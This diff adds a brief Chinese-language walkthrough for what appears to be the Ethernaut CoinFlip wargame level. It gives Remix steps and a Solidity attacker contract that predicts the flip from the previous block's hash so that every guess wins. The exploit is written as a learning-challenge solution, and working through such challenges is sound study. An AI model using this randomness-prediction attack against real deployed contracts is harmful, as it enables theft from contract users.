@@ -1,0 +1,16 @@
+CoinFlip
+1.打开Remix
+2.将CoinFlip合约放入remix中
+3.在同一个文件中加入以下代码
+contract CoinFlip1 is CoinFlip{
+    using SafeMath for uint256;
+
+    function flipTest(CoinFlip coinFlipAddress) public {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1))).div(FACTOR);
+        coinFlipAddress.flip(blockValue == 1);
+    }
+}
+4.部署CoinFlip1
+5.每隔一个区块调用一次flipTest方法，传入CoinFlip合约地址
+6.使用合约地址生成CoinFlip合约
+7.调用consecutiveWins方法返回10将完成
